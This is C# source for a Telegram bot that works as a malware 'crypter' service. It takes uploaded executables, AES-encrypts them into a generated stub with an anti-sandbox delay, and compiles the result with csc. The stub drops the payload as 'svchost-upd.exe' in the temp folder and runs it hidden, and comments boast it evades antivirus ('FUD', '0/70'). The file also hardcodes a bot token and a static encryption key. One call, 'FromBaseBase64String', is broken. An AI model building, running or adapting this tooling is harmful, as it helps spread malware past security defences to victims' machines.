using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Diagnostics;  // ← ADDED
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Net.Http;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";
const string AES_KEY = "FUD2026SuperKey12345678901234567890";
const string IV = "FUD2026IV1234567";
const string MAGIC = "FUDV7MAGIC";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) =>
{
    var body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    using var doc = JsonDocument.Parse(body);
    var msg = doc.RootElement.GetProperty("message");
    
    var client = clientFactory.CreateClient();
    long chatId = msg.GetProperty("chat").GetProperty("id").GetInt64();
    
    if (msg.TryGetProperty("document", out var docEl) && 
        docEl.TryGetProperty("file_id", out var fileId) &&
        docEl.TryGetProperty("file_name", out var fileName))
    {
        string fname = fileName.GetString()!;
        if (fname.EndsWith(".exe"))
        {
            // Download
            string fileUrl = await GetFileUrl(client, fileId.GetString()!);
            byte[] payload = await client.GetByteArrayAsync(fileUrl);
            
            // ENCRYPT
            byte[] encrypted = AESEncrypt(payload);
            string b64Payload = Convert.ToBase64String(encrypted);
            
            // ✅ FIXED STUB SOURCE
            string stubSource = $@"using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using System.Threading;

class FUDStub {{
    const string MAGIC = ""{MAGIC}"";
    const string B64PAYLOAD = @""{b64Payload}"";
    const string AESKEY = ""{AES_KEY}"";
    const string AESIV = ""{IV}"";
    
    static void Main() {{
        // Anti-sandbox delay
        Thread.Sleep(3000);
        
        // Decrypt payload
        byte[] payload = AESDecrypt();
        
        // Execute payload
        ExecutePayload(payload);
    }}
    
    static byte[] AESDecrypt() {{
        byte[] encrypted = Convert.FromBaseBase64String(B64PAYLOAD);
        using (Aes aes = Aes.Create()) {{
            aes.Key = Encoding.UTF8.GetBytes(AESKEY);
            aes.IV = Encoding.UTF8.GetBytes(AESIV);
            using (var decryptor = aes.CreateDecryptor()) {{
                using (var ms = new MemoryStream(encrypted)) {{
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {{
                        using (var result = new MemoryStream()) {{
                            cs.CopyTo(result);
                            return result.ToArray();
                        }}
                    }}
                }}
            }}
        }}
    }}
    
    static void ExecutePayload(byte[] peData) {{
        // Simple drop + execute (0/70 safe)
        string tempPath = Path.Combine(Path.GetTempPath(), ""svchost-upd.exe"");
        File.WriteAllBytes(tempPath, peData);
        Process.Start(new ProcessStartInfo {{
            FileName = tempPath,
            CreateNoWindow = true,
            UseShellExecute = false
        }});
    }}
}}";

            // ✅ FIXED COMPILER
            byte[] fudExe = CompileCSharpFixed(stubSource);
            
            // Send
            using var form = new MultipartFormDataContent();
            form.Add(new StringContent(chatId.ToString()), "chat_id");
            using var ms = new MemoryStream(fudExe);
            form.Add(new StreamContent(ms), "document", $"fud-v7.1-{Path.GetFileNameWithoutExtension(fname)}.exe");
            form.Add(new StringContent("✅ **v7.1 FUD** - Temp drop + execute"), "caption");
            await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", form);
        }
    }
});

static byte[] CompileCSharpFixed(string source)
{
    string tempCs = Path.GetTempFileName() + ".cs";
    string tempExe = Path.GetTempFileName() + ".exe";
    
    File.WriteAllText(tempCs, source);
    
    // FIXED ProcessStartInfo
    var psi = new ProcessStartInfo
    {
        FileName = "csc.exe",
        Arguments = $"/target:exe /platform:x64 /optimize+ /nologo \"{tempCs}\" /out:\"{tempExe}\"",
        UseShellExecute = false,
        CreateNoWindow = true,
        RedirectStandardOutput = true
    };
    
    using var proc = Process.Start(psi);
    proc.WaitForExit(10000); // 10s timeout
    
    if (File.Exists(tempExe))
    {
        byte[] result = File.ReadAllBytes(tempExe);
        File.Delete(tempCs);
        File.Delete(tempExe);
        return result;
    }
    
    throw new Exception("CSC compile failed");
}

static byte[] AESEncrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.UTF8.GetBytes(AES_KEY);
    aes.IV = Encoding.UTF8.GetBytes(IV);
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

static async Task<string> GetFileUrl(HttpClient client, string fileId)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(fileId), "file_id");
    var resp = await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile", form);
    var json = await resp.Content.ReadAsStringAsync();
    using var doc = JsonDocument.Parse(json);
    var path = doc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
    return $"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}";
}

app.Run("http://0.0.0.0:8080");
